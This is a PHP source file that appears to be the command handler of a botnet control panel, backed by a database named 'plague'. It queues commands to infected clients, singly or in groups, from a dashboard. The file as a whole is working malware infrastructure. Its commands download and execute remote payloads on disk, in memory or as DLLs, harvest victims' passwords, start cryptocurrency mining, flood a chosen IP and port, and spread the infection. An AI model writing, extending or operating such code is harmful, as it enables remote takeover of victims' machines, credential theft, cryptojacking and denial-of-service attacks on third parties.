<?php
include('data.php');

if(isset($_POST['Target'])) $Target = $_POST['Target']; else $Target = '';
if(($Target=='Select a Target') or (strlen($Target)==0)){
	header('Location: dashboard.php?tab=Commands&failure=' . urlencode('Target not set.'));
	die();
}

if($Target=='Single Client'){
	if(!isset($_POST['GUID']) or empty($_POST['GUID'])){
		header('Location: dashboard.php?tab=Commands&failure=' . urlencode('GUID not set.'));
		die();
	} else $GUID = $_POST['GUID'];
}

if(isset($_POST['Command'])) $Cmd = $_POST['Command'];
if(($Cmd=='Select a Command') or (strlen($Cmd)==0)){
	header('Location: dashboard.php?tab=Commands&failure=' . urlencode('Command not set.'));
	die();
}

//Evaluate command
$ParamArray = array();
switch($Cmd){
	case 'Restart Client':{
		$Cmd = 'Restart';
	} break;
	case 'Update Client':{
		$Cmd = 'Update';
		$ParamArray = array('URL'=>$_POST['Param1']);
	} break;
	case 'Uninstall Client':{
		$Cmd = 'Uninstall';
	} break;
	case 'Download File':{
		$Cmd = 'Download';
		$ParamArray = array('URL'=>$_POST['Param1'], 'LocalName'=>$_POST['Param2']);
	} break;
	case 'Upload File':{
		$Cmd = 'Upload';
		$ParamArray = array('FileName'=>$_POST['Param1']);
	} break;
	case 'Download and Execute [Drop]':{
		$Cmd = 'DropExec';
		$ParamArray = array('URL'=>$_POST['Param1']);
	} break;
	case 'Download and Execute [Memory]':{
		$Cmd = 'MemExec';
		$ParamArray = array('URL'=>$_POST['Param1']);
	} break;
	case 'Download and Execute [DLL]':{
		$Cmd = 'MemDLL';
		$ParamArray = array('URL'=>$_POST['Param1']);
	} break;
	case 'Recover Passwords':{
		$Cmd = 'Passwords';
	} break;
	case 'Start Mining':{
		$Cmd = 'Mine';
		$ParamArray = array('Bitness'=>$_POST['Param1']);
	} break;
	case 'Start Flooding':{
		$Cmd = 'Flood';
		$ParamArray = array('IPAddress'=>$_POST['Param1'], 'Port'=>$_POST['Param2']);
	} break;
	case 'Enable Spreading':{
		$Cmd = 'Spread';
	} break;
	case '🛑 Abort a Command':{
		$Cmd = 'Abort';
		$ParamArray = array('CommandID'=>$_POST['Param1']);
	} break;
	default:{
		header('Location: dashboard.php?tab=Commands&failure=' . urlencode('Invalid command.'));
		die();
	}
}

if(!ConnectDB('plague')){
	http_response_code(500);
	die('Failed to connect to the database.');
}

switch($Target){
	case 'Single Client':{
		QueueCommand($GUID, $Cmd, $ParamArray, array());
	} break;
	default:{
		QueueCommandEx($Target, $Cmd, $ParamArray);
	}
}

header('Location: dashboard.php?tab=Commands&success');

?>